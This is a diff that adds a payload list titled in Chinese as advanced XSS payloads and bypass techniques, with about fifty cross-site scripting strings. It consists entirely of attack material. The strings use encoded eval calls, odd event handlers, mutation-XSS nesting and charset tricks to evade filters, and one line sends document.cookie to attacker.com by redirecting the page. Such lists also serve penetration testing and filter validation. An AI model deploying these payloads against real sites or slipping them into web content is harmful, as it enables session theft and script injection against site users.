@@ -1,0 +1,50 @@
+# 高级XSS有效载荷与绕过技术
+<script>Function("ale"+"rt(1)")();</script>
+<script>['ale'+'rt'](1)</script>
+<script>window['alert'](0)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<svg onload=prompt(1);>
+<script>new Function`alt\`1\``</script>
+<script>(()=>{return this})().alert(1)</script>
+<script>var{a:onerror}={a:eval};throw 'alert\x281\x29'</script>
+<img/id="'`-->" src=x onerror=javascript:alert(2)>
+<img src=x onerror=eval('\141\154\145\162\164\50\61\51')>
+<body/onhashchange=alert(1)><a href=#>click
+<iframe src=javascript:alert(1)//
+<script ~~~>confirm(1)</script ~~~>
+<script>$=Function,$($()\`alert\\\`1\\\`\`)();</script>
+<script>onerror=eval;throw'=alert\x281\x29';</script>
+<script>delete[a],alert(1)</script>
+<svg><discard onbegin=alert(1)>
+<math href="javascript:alert(1)">CLICKME</math>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+<a href="j&Tab;a&Tab;v&Tab;asc&Tab;r&Tab;ipt&colon;confirm&lpar;1&rpar;">Click</a>
+<dETAILS open onToGgle=a=alert,a(1)>
+<iframe src="javascript:void(top[Object.keys(top)[2]](Object.keys(top)[5]))" width="500" height="500"></iframe>
+<embed code="//x.test/xss.swf" allowscriptaccess=always></embed>
+<svg><set onbegin=d=document;d.evaluate('\u0061lert(1)',d,null,6,null).iterateNext() >
+<iframe/onload=action=URL;Array(1).keys(a=function(...args)args[0].dispatchEvent(new+Event('focus'))).next(a(body.querySelector('input[autofocus]'))>
+<math><mtext><option><FAKEELEMENT><math><option><annotation-xml encoding="text/html"><iframe onload=alert(1)></iframe></annotation-xml></math></option></option></mtext></math>
+<style>:target {color:red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=alert(1)></xss>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1m></animate>
+<details/open=/id=x tabindex=1 onfocus=alert(1) id=x>
+<img src onerror=\u0065\u0076\u0061\u006c\u0028\u0061\u0074\u006f\u0062\u0028\u0027\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u0059\u0053\u0063\u0072\u0056\u006c\u004e\u0054\u004a\u0027\u0029\u0029>
+<iframe/src="data:text/html,<svg onload=confirm(1)>"><script>~'</script><!--<script>eval('var a=String.fromCharCode(47);var b=String.fromCharCode(42);var c=String.fromCharCode(42);var d=String.fromCharCode(47);eval(\'docu\'+\'ment.bod\'+\'y.inne\'+\'rHTML="Hac\'+\'ked"\');')</script>
+<object data="data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e"></object>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<textarea id=ta onfocus=console.log(event)></textarea><div contenteditable onbeforeinput="ta.dispatchEvent(new InputEvent('input', {inputType: 'insertFromPaste', data: 'alert(1)', dataTransfer: new DataTransfer()}))"
+<div style="filter:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');">
+<iframe srcdoc="<script>top[8680439..toString(30)](1)</script>">
+<P%=tE%xt><svg/o%=nload=confirm(9)><ClIcK me</SvG>
+<svg><animate onbegin%3D=alert%26%23x28;)></animate>
+<input type="search" onsearch="alert()()()()" />
+<meta charset="x-mac-farsi">\u03C3cript\u03BE alert('xss');</script>
+<scr\0ipt>confirm(1)</scr\0ipt>
+<a onmouseover="document['cookie']=['Cookie Monster!']; alert(document['cookie'])">XSS</a>
+<img/src='data:image/svg+xml,<svg onload=alert(1)>' />
+<input onfocus="alert(document.domain);" autofocus>
+<script>throw{set:document.location='//attacker.com',name:'cookie',message:document.cookie}</script>
+<input autofocus="autofocus"onkeyup="this.focus();var a=this.style.box-shadow; a = document.domain; alert(a);" value="I contain info">
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11; id="fuzzelement1">test</a>
+<div style="background:url(http://foo.f/f ='`'><script>alert(1)</script>"><script>alert(1)</script>
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"></import> <t:set attributeName="innerHTML" targetElement="x" to="<img src=x onerror=alert(1)>"></t:set> 
